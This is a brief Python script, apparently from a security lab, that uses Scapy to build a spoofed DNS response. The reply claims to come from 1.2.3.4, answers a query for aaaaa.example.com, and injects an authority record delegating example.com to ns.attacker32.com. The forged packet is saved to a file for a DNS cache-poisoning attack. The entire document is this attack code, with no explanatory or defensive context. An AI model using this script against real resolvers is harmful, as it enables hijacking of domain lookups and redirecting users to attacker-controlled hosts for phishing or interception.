from scapy.all import *

targetName = 'aaaaa.example.com'
targetDomain = 'example.com'
attackerNS = 'ns.attacker32.com'

dstIP = '10.9.0.53'
srcIP = '1.2.3.4'

ip = IP(dst=dstIP, src=srcIP, chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)

Qdsec = DNSQR(qname=targetName)

Anssec = DNSRR(rrname=targetName,
               type='A',
               rdata='1.1.1.1',
               ttl=259200)

NSsec = DNSRR(rrname=targetDomain,
               type='NS',
               rdata=attackerNS,
               ttl=259200)

dns = DNS(id = 0xAAAA, aa=1, rd=1, qr=1,
          qdcount = 1, qd = Qdsec,
          ancount = 1, an = Anssec,
          nscount = 1, ns = NSsec)

Replypkt = ip/udp/dns

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(Replypkt))